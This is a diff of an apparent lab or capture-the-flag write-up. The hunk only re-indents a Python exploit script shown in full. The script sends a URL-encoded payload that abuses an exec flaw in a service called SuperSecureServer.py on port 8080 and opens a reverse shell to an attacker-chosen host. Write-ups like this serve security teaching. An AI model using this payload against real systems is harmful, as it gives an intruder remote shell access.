@@ -160,20 +160,20 @@ The flaw in their code is seen here. The info variable line and exec function is
 
 Get creative, if you wish. The pre-text does not really matter.
 ```python
-#!/usr/bin/env python3
-from sys import argv
-import requests
-import urllib
-import os
+    #!/usr/bin/env python3
+    from sys import argv
+    import requests
+    import urllib
+    import os
 
-address = '{}/'.format(argv[3])
-revshell = 'SUCKITLOL\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash", "-i"])\na=\''.format(argv[1], argv[2])
-payload = urllib.parse.quote(revshell)
+    address = '{}/'.format(argv[3])
+    revshell = 'SUCKITLOL\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash", "-i"])\na=\''.format(argv[1], argv[2])
+    payload = urllib.parse.quote(revshell)
 
-print(address + payload)
-RESPONSE = requests.get(address + payload)
-print(RESPONSE.headers)
-print(RESPONSE.text)
+    print(address + payload)
+    RESPONSE = requests.get(address + payload)
+    print(RESPONSE.headers)
+    print(RESPONSE.text)
 ```
 
 This reverse shell payload can be executed against the SuperSecureServer.py service running on tcp/8080.<br>
